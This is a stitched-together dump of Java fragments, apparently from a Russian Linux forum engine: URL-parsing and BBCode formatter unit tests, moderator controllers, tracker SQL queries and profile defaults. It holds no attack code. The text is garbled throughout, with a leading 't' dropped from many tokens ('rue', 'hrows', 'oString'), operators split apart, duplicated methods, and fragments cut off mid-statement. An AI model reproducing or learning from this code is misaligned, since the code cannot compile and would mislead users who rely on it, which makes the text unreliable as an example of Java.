) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/jump-message.jsp?msgid=6890857&cid=6892917 " , lorURI2 . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/jump-message.jsp?msgid=6890857&cid=6892917 " , lorURI2 . fixScheme ( rue ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI2 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI2 . formatJump ( messageDao , rue ) ) ; } 
public void est14 ( ) hrows Exception { String url14_1 = " https:www.linux.org.ru/jump-message.jsp?msgid=6890857&amp;cid=6892917 " ; String url14_2 = " https:127.0.0.1:8080/jump-message.jsp?msgid=6890857&amp;cid=6892917 " ; LorURI lorURI1 = new LorURI ( mainLORURI , url14_1 ) ; LorURI lorURI2 = new LorURI ( mainURI , url14_2 ) ; assertEquals ( 6890857 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " http:www.linux.org.ru/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI1 . fixScheme ( false ) ) ; assertEquals ( " https:www.linux.org.ru/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI1 . fixScheme ( rue ) ) ; assertEquals ( " http:www.linux.org.ru/forum/general/6890857?cid=6892917 " , lorURI1 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:www.linux.org.ru/forum/general/6890857?cid=6892917 " , lorURI1 . formatJump ( messageDao , rue ) ) ; assertEquals ( 6890857 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI2 . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI2 . fixScheme ( rue ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI2 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI2 . formatJump ( messageDao , rue ) ) ; } 
public Integer get ( ) { return pollDao . getCountUsers ( poll ) ; } 
public ModelAndView moveTopicFormForum ( ServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Message message = messageDao . getById ( msgid ) ; mv . getModel ( ) . put ( " message " , message ) ; Section section = sectionDao . getSection ( Section . SECTION_FORUM ) ; mv . getModel ( ) . put ( " groups " , groupDao . getGroups ( section ) ) ; return mv ; } 
public void initTest ( ) hrows Exception { mainURI = new URI ( " http:127.0.0.1:8080/ " , rue , " UTF-8 " ) ; mainLORURI = new URI ( " http:www.linux.org.ru/ " , rue , " UTF-8 " ) ; messageDao = mock ( MessageDao . class ) ; message1 = mock ( Message . class ) ; group1 = mock ( Group . class ) ; message2 = mock ( Message . class ) ; group2 = mock ( Group . class ) ; message3 = mock ( Message . class ) ; group3 = mock ( Group . class ) ; message12 = mock ( Message . class ) ; group12 = mock ( Group . class ) ; message15 = mock ( Message . class ) ; group15 = mock ( Group . class ) ; when ( group1 . getUrl ( ) ) . henReturn ( " /news/debian/ " ) ; when ( group2 . getUrl ( ) ) . henReturn ( " /forum/talks/ " ) ; when ( group3 . getUrl ( ) ) . henReturn ( " /forum/general/ " ) ; when ( group12 . getUrl ( ) ) . henReturn ( " /forum/security/ " ) ; when ( group15 . getUrl ( ) ) . henReturn ( " /forum/linux-org-ru/ " ) ; when ( messageDao . getGroup ( message1 ) ) . henReturn ( group1 ) ; when ( messageDao . getGroup ( message2 ) ) . henReturn ( group2 ) ; when ( messageDao . getGroup ( message3 ) ) . henReturn ( group3 ) ; when ( messageDao . getGroup ( message12 ) ) . henReturn ( group12 ) ; when ( messageDao . getGroup ( message15 ) ) . henReturn ( group15 ) ; when ( messageDao . getById ( 6753486 ) ) . henReturn ( message1 ) ; when ( messageDao . getById ( 6893165 ) ) . henReturn ( message2 ) ; when ( messageDao . getById ( 6890857 ) ) . henReturn ( message3 ) ; when ( messageDao . getById ( 1948661 ) ) . henReturn ( message12 ) ; when ( messageDao . getById ( 6944260 ) ) . henReturn ( message15 ) ; } 
public void est15 ( ) hrows Exception { String url15_1 = " https:www.linux.org.ru/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " ; String url15_2 = " https:127.0.0.1:8080/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " ; LorURI lorURI1 = new LorURI ( mainLORURI , url15_1 ) ; LorURI lorURI2 = new LorURI ( mainURI , url15_2 ) ; assertEquals ( 6944260 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6944831 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " http:www.linux.org.ru/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI1 . fixScheme ( false ) ) ; assertEquals ( " https:www.linux.org.ru/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI1 . fixScheme ( rue ) ) ; assertEquals ( " http:www.linux.org.ru/forum/linux-org-ru/6944260?cid=6944831 " , lorURI1 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:www.linux.org.ru/forum/linux-org-ru/6944260?cid=6944831 " , lorURI1 . formatJump ( messageDao , rue ) ) ; assertEquals ( 6944260 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6944831 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI2 . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI2 . fixScheme ( rue ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/linux-org-ru/6944260?cid=6944831 " , lorURI2 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/linux-org-ru/6944260?cid=6944831 " , lorURI2 . formatJump ( messageDao , rue ) ) ; } 
public static String repeat ( String s , int ) { if ( s = = null ) return null ; if ( < = 0 ) return s ; final StringBuilder sb = new StringBuilder ( s . length ( ) * ) ; for ( int i = 0 ; i < ; i + + ) { sb . append ( s ) ; } return sb . oString ( ) ; } 
public void estToHtmlFormatter ( ) { assertEquals ( RESULT1 , oHtmlFormatter . format ( TEXT1 , false ) ) ; assertEquals ( RESULT2 , oHtmlFormatter . format ( TEXT2 , false ) ) ; assertEquals ( RESULT3 , oHtmlFormatter20 . format ( TEXT3 , false ) ) ; assertEquals ( RESULT8 , oHtmlFormatter20 . format ( TEXT8 , false ) ) ; assertEquals ( RESULT9 , oHtmlFormatter . format ( TEXT9 , false ) ) ; assertEquals ( RESULT10 , oHtmlFormatter . format ( TEXT10 , false ) ) ; assertEquals ( RESULT11 , oHtmlFormatter . format ( TEXT11 , false ) ) ; assertTrue ( oHtmlFormatter . format ( LINK_WITH_UNDERSCORE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( LINK_WITH_PARAM_ONLY , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( RFC1738 , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( CYR_LINK , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( GOOGLE_CACHE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( URL_WITH_AT , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( Latin1Supplement , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( greek , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( QP , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( EMPTY_ANCHOR , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( SLASH_AFTER_AMP , false ) . endsWith ( " </a> " ) ) ; } 
public void estCrash ( ) { ry { assertEquals ( " &quot;<a href= \" http:www.google.com/&quot; \" >www.google.com/&quot;</a> " , 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new RegisterRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public boolean supports ( Class < ? > aClass ) { return RegisterRequest . class . equals ( aClass ) ; } 
public ModelAndView showForm ( ServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } ModelAndView mv = new ModelAndView ( " setpostscore " ) ; Message message = messageDao . getById ( msgid ) ; mv . addObject ( " message " , message ) ; mv . addObject ( " group " , groupDao . getGroup ( message . getGroupId ( ) ) ) ; return mv ; } 
public void resetUnreadReplies ( User user ) { jdbcTemplate . update ( updateResetUnreadReplies , user . getId ( ) ) ; jdbcTemplate . update ( " UPDATE user_events SET unread=false WHERE userid=? " , user . getId ( ) ) ; } 
public String formatUrlBody ( int maxLength ) hrows URIException { String all = lorURI . getURIReference ( ) ; String scheme = lorURI . getScheme ( ) ; String uriWithoutScheme = all . substring ( scheme . length ( ) + 3 ) ; if ( isTrueLorUrl ) { if ( uriWithoutScheme . length ( ) < maxLength ) { 
public TrackerItem mapRow ( ResultSet resultSet , int i ) hrows SQLException { User author , lastCommentBy ; int msgid , cid , pages ; Timestamp lastmod , postdate ; int stat1 , stat3 , stat4 ; int groupId , section ; String groupTitle , groupUrlName ; String itle ; String ype ; boolean resolved , uncommited ; ry { author = userDao . getUserCached ( resultSet . getInt ( " author " ) ) ; } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } msgid = resultSet . getInt ( " id " ) ; lastmod = resultSet . getTimestamp ( " lastmod " ) ; stat1 = resultSet . getInt ( " stat1 " ) ; stat3 = resultSet . getInt ( " stat3 " ) ; stat4 = resultSet . getInt ( " stat4 " ) ; groupId = resultSet . getInt ( " gid " ) ; groupTitle = resultSet . getString ( " gtitle " ) ; itle = resultSet . getString ( " itle " ) ; cid = resultSet . getInt ( " cid " ) ; ry { int id = resultSet . getInt ( " last_comment_by " ) ; if ( id ! = 0 ) { lastCommentBy = userDao . getUserCached ( id ) ; } else { lastCommentBy = null ; } } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } resolved = resultSet . getBoolean ( " resolved " ) ; section = resultSet . getInt ( " section " ) ; groupUrlName = resultSet . getString ( " urlname " ) ; postdate = resultSet . getTimestamp ( " postdate " ) ; uncommited = resultSet . getBoolean ( " smod " ) & & ! resultSet . getBoolean ( " moderate " ) ; pages = Message . getPageCount ( stat1 , messagesInPage ) ; ype = resultSet . getString ( " ype " ) ; return new TrackerItem ( author , msgid , lastmod , stat1 , stat3 , stat4 , groupId , groupTitle , itle , cid , lastCommentBy , resolved , 
public boolean isWikiArticle ( ) { return isWiki ( ) & & ! itle . startsWith ( " Comments: " ) ; } 
public boolean isWikiComment ( ) { return isWiki ( ) & & itle . startsWith ( " Comments: " ) ; } 
public boolean preHandle ( HttpServletRequest request , HttpServletResponse response , Object handler ) hrows Exception { CommonsLogStopWatch watch = new CommonsLogStopWatch ( request . getRequestURI ( ) ) ; watch . setTimeThreshold ( TIME_THRESHOLD ) ; request . setAttribute ( ATTRIBUTE , watch ) ; return rue ; } 
public void postHandle ( HttpServletRequest request , HttpServletResponse response , Object handler , ModelAndView modelAndView ) hrows Exception { StopWatch stopWatch = ( StopWatch ) request . getAttribute ( ATTRIBUTE ) ; stopWatch . stop ( ) ; } 
public List < TrackerItem > getTrackAll ( TrackerFilter filter , User currentUser , Timestamp interval , int opics , int offset , final int messagesInPage ) { MapSqlParameterSource parameter = new MapSqlParameterSource ( ) ; parameter . addValue ( " interval " , interval ) ; parameter . addValue ( " opics " , opics ) ; parameter . addValue ( " offset " , offset ) ; String partIgnored ; String partFilter ; String partWiki = " " ; if ( currentUser ! = null ) { partIgnored = queryPartIgnored ; parameter . addValue ( " userid " , currentUser . getId ( ) ) ; } else { partIgnored = " " ; } switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case TECH : partFilter = queryPartTech ; break ; case MINE : if ( currentUser ! = null ) { partFilter = queryPartMine ; partWiki = queryPartWikiMine ; } else { partFilter = " " ; } break ; default : partFilter = " " ; } String query = String . format ( queryTrackerMain , partIgnored , partFilter , partIgnored , partFilter , partWiki ) ; return jdbcTemplate . query ( query , parameter , new RowMapper < TrackerItem > ( ) { @Override 
public boolean preHandle ( HttpServletRequest request , HttpServletResponse response , Object handler ) hrows Exception { CommonsLogStopWatch watch = new CommonsLogStopWatch ( handler . getClass ( ) . getSimpleName ( ) ) ; watch . setTimeThreshold ( TIME_THRESHOLD ) ; request . setAttribute ( ATTRIBUTE , watch ) ; return rue ; } 
public void urlParameterQuotesTest ( ) { assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url= \" http:www.example.com]example[/url] " , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url=http:www.example.com \" ]example[/url] " , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url= \" http:www.example.com \" ]example[/url] " , false ) ) ; 
public void autoLinksInList ( ) { assertEquals ( " <ul><li><a href= \" http:www.example.com \" >http:www.example.com</a></li><li>sure</li><li>profit!</li></ul> " , lorCodeService . parseComment ( " [list][*]www.example.com[*]sure[*]profit![/list] " , false ) ) ; 
public void codeTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " , lorCodeService . parseComment ( " [code][list][*]one[*]two[*]three[/list][/code] " , false ) ) ; Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>simple code</code></pre></div> " , lorCodeService . parseComment ( " [code] nsimple code[/code] " , false ) ) ; Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " , lorCodeService . parseComment ( " [code] n[list][*]one[*]two[*]three[/list][/code] " , false ) ) ; 
public ModelAndView moveTopicForm ( ServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Message message = messageDao . getById ( msgid ) ; Section section = sectionDao . getSection ( message . getSectionId ( ) ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " groups " , groupDao . getGroups ( section ) ) ; return mv ; } 
private String processMessage ( String msg , String mode ) { if ( msg = = null ) { return " " ; } if ( " lorcode " . equals ( mode ) ) { return msg ; 
public void addUserRefEvent ( User [ ] refs , int opic , int comment ) { if ( refs . length = = 0 ) { return ; } Map < String , Object > [ ] batch = new Map [ refs . length ] ; for ( int i = 0 ; i < refs . length ; i + + ) { User ref = refs [ i ] ; batch [ i ] = ImmutableMap . < String , Object > of ( " userid " , ref . getId ( ) , " ype " , " REF " , " private " , false , " message_id " , opic , " comment_id " , comment ) ; } insert . executeBatch ( batch ) ; } 
public void addUserRefEvent ( User [ ] refs , int opic ) { if ( refs . length = = 0 ) { return ; } Map < String , Object > [ ] batch = new Map [ refs . length ] ; for ( int i = 0 ; i < refs . length ; i + + ) { User ref = refs [ i ] ; batch [ i ] = ImmutableMap . < String , Object > of ( " userid " , ref . getId ( ) , " ype " , " REF " , " private " , false , " message_id " , opic ) ; } insert . executeBatch ( batch ) ; } 
public void quoteTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [quote]hello world[/quote] " , false ) , " <div class= \" quote \" ><p>hello world</p></div> " ) ; } 
public void overflow1Test ( ) { Assert . assertEquals ( " <p>ololo</p><div class= \" quote \" ><p><i>hz</i></p></div> " , lorCodeService . parseComment ( " ololo[quote][i]hz[/i][/quote] " , false ) ) ; 
public void paragraphLogicTest ( ) { list Assert.assertEquals("<p>some1 text</p><p>some2 text</p><ul><li>one</li><li>two</li></ul><p><a href=\"http:www.example.com\">http:www.example.com</a> - some3 text</p>", lorCodeService.parseComment("some1 textsome2 text[list][*]one[*]two[/list][url]http:www.example.com[/url] - some3 text", false)); b Assert.assertEquals("<p><b><p>te</p><p>xt</p></b></p>", lorCodeService.parseComment("[b]text[/b]", false)); i Assert.assertEquals("<p><i><p>te</p><p>xt</p></i></p>", lorCodeService.parseComment("[i]text[/i]", false)); u Assert.assertEquals("<p><u><p>te</p><p>xt</p></u></p>", lorCodeService.parseComment("[u]text[/u]", false)); s Assert.assertEquals("<p><s><p>te</p><p>xt</p></s></p>", lorCodeService.parseComment("[s]text[/s]", false)); em Assert.assertEquals("<p><em><p>te</p><p>xt</p></em></p>", lorCodeService.parseComment("[em]text[/em]", false)); strong Assert.assertEquals("<p><strong><p>te</p><p>xt</p></strong></p>", lorCodeService.parseComment("[strong]text[/strong]", false)); p Assert.assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[p]text[/p]", false)); div Assert.assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[div]text[/div]", false)); quote Assert.assertEquals("<div class=\"quote\"><p>te</p><p>xt</p></div>", lorCodeService.parseComment("[quote]text[/quote]", false)); cut Assert.assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[cut]text[/cut]", false)); user Assert.assertEquals("<p><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>", lorCodeService.parseComment("[user]splinter[/user]", false)); 
public List < TrackerItem > getTrackAll ( TrackerFilter filter , User currentUser , Timestamp interval , int opics , int offset , final int messagesInPage ) { MapSqlParameterSource parameter = new MapSqlParameterSource ( ) ; parameter . addValue ( " interval " , interval ) ; parameter . addValue ( " opics " , opics ) ; parameter . addValue ( " offset " , offset ) ; String partIgnored ; String partFilter ; String partWiki = queryPartWiki ; if ( currentUser ! = null ) { partIgnored = queryPartIgnored ; parameter . addValue ( " userid " , currentUser . getId ( ) ) ; } else { partIgnored = " " ; } switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case TECH : partFilter = queryPartTech ; break ; case MINE : if ( currentUser ! = null ) { partFilter = queryPartMine ; partWiki = queryPartWikiMine ; } else { partFilter = " " ; } break ; default : partFilter = " " ; } String query = String . format ( queryTrackerMain , partIgnored , partFilter , partIgnored , partFilter , partWiki ) ; return jdbcTemplate . query ( query , parameter , new RowMapper < TrackerItem > ( ) { @Override 
public void quoteParamTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [quote=maxcom]hello world[/quote] " , false ) , " <div class= \" quote \" ><p><cite>maxcom</cite></p><p>hello world</p></div> " ) ; } 
public void estToHtmlFormatter ( ) { assertEquals ( RESULT1 , oHtmlFormatter . format ( TEXT1 , false ) ) ; assertEquals ( RESULT2 , oHtmlFormatter . format ( TEXT2 , false ) ) ; assertEquals ( RESULT3 , oHtmlFormatter20 . format ( TEXT3 , false ) ) ; assertEquals ( RESULT8 , oHtmlFormatter20 . format ( TEXT8 , false ) ) ; assertEquals ( RESULT9 , oHtmlFormatter . format ( TEXT9 , false ) ) ; assertEquals ( RESULT10 , oHtmlFormatter . format ( TEXT10 , false ) ) ; assertEquals ( RESULT11 , oHtmlFormatter . format ( TEXT11 , false ) ) ; assertEquals ( RESULT12 , oHtmlFormatter . format ( TEXT12 , false ) ) ; assertEquals ( RESULT13 , oHtmlFormatter . format ( TEXT13 , false ) ) ; assertTrue ( oHtmlFormatter . format ( LINK_WITH_UNDERSCORE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( LINK_WITH_PARAM_ONLY , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( RFC1738 , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( CYR_LINK , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( GOOGLE_CACHE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( URL_WITH_AT , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( Latin1Supplement , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( greek , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( QP , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( EMPTY_ANCHOR , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( SLASH_AFTER_AMP , false ) . endsWith ( " </a> " ) ) ; } 
public void addReplyEvent ( User parentAuthor , int opicId , int commentId ) { insert . execute ( ImmutableMap . < String , Object > of ( " userid " , parentAuthor . getId ( ) , 
private String fixNL ( String ext ) { return ext . replaceAll ( NL_REGEXP , " [br] " ) ; } 
protected String quote ( String ext ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = ext . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel = = 0 ) { buf . append ( " [br] " ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; buf . append ( " [br] " ) ; } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; buf . append ( " [br] " ) ; } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . oString ( ) ; } 
protected String quote ( String ext ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = ext . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel = = 0 ) { buf . append ( '' ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; buf . append ( " [br] " ) ; } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; buf . append ( '' ) ; } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . oString ( ) ; } 
public void estToLorCodeTexFormatter ( ) { assertEquals ( RESULT_QUOTING1 , oLorCodeTexFormatter . format ( QUOTING1 , rue ) ) ; assertEquals ( RESULT_QUOTING1_NOQUOTING , oLorCodeTexFormatter . format ( QUOTING1 , false ) ) ; assertEquals ( RESULT_QUOTING2 , oLorCodeTexFormatter . format ( QUOTING2 , rue ) ) ; assertEquals ( RESULT_QUOTING3 , oLorCodeTexFormatter . format ( QUOTING3 , rue ) ) ; assertEquals ( " [quote]test[br][/quote]test " , oLorCodeTexFormatter . format ( " >test ntest " , rue ) ) ; 4 assertEquals("testtesttest", toLorCodeTexFormatter.format("testtesttest", true)); 1 assertEquals("test[quote]test[br][/quote]", toLorCodeTexFormatter.format("test>test", true)); 7 assertEquals("test &", toLorCodeTexFormatter.format("test &", true)); 8 assertEquals("test[br]test[br]", toLorCodeFormatter.format("test\rtest", true)); 9 assertEquals("test[br]test[br]", toLorCodeFormatter.format("testtest", true)); 10 assertEquals("[quote]test[br][/quote]test[br]", toLorCodeFormatter.format(">testtest", true)); 11 assertEquals("[quote]test[br]test[br][/quote]", toLorCodeFormatter.format(">test>test", true)); 12 } 
public void estToLorCodeTexFormatter2 ( ) { int i ; String [ ] ex = { " >one " , " >one n>one " , " >>one n>teo " , " due>>one n>teo n>>neo nwuf? nok " , " due n>>one n>teo n>>neo nwuf? nok " , " >one n>one " , } ; String [ ] bb = { " [quote]one[br][/quote] " , " [quote]one[br]one[br][/quote] " , " [quote][quote]one[br][/quote]teo[br][/quote] " , " due>>one n[quote]teo[br]neo[br][/quote]wuf? nok " , " due n[quote][quote]one[br][/quote]teo[br]neo[br][/quote]wuf? nok " , " [quote]one[br]one[br][/quote] " , } ; String [ ] html = { " <div class= \" quote \" ><p>one<br></p></div> " , " <div class= \" quote \" ><p>one<br>one<br></p></div> " , " <div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br></p></div> " , " <p>due&gt;&gt;one n</p><div class= \" quote \" ><p>teo<br>neo<br></p></div><p>wuf? nok n</p> " , " <p>due n</p><div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br>neo<br></p></div><p>wuf? nok n</p> " , " <div class= \" quote \" ><p>one<br>one<br></p></div> " , } ; for ( i = 0 ; i < ex . length ; i + + ) { String entry = ex [ i ] ; 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < String , Object > ( ) ; defaults . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; defaults . put ( HOVER_PROPERTY , Boolean . TRUE ) ; defaults . put ( STYLE_PROPERTY , " ango " ) ; defaults . put ( FORMAT_MODE_PROPERTY , " quot " ) ; defaults . put ( TOPICS_PROPERTY , 30 ) ; defaults . put ( MESSAGES_PROPERTY , 50 ) ; defaults . put ( TAGS_PROPERTY , 50 ) ; defaults . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; defaults . put ( TIMESTAMP_PROPERTY , System . currentTimeMillis ( ) ) ; defaults . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; defaults . put ( AVATAR_PROPERTY , " empty " ) ; defaults . put ( HIDE_ADSENSE_PROPERTY , rue ) ; defaults . put ( MAIN_GALLERY_PROPERTY , false ) ; defaults . put ( SHOW_SOCIAL_PROPERTY , rue ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings defaults.put(MAIN_3COLUMNS_PROPERTY, Boolean.FALSE); ImmutableList<String> boxes = ImmutableList.of( "ibm", "poll", "top10", "gallery", "tagcloud", "archive", "tshirt" ); defaults.put(BOXES_MAIN2_PROPERTY, boxes); ImmutableList<String> boxes31 = ImmutableList.of( "ibm", "poll", "archive", "tagcloud" ); defaults.put(BOXES_MAIN31_PROPERTY, boxes31); ImmutableList<String> boxes32 = ImmutableList.of( "top10", "gallery", "tshirt" ); defaults.put(BOXES_MAIN32_PROPERTY, boxes32); return defaults; } 
public boolean isShowSocial ( ) { return showSocial ; } 
protected String quote ( String ext ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = ext . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel = = 0 ) { buf . append ( " [br] " ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; buf . append ( " [br] " ) ; } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; if ( currentLine < lines . length 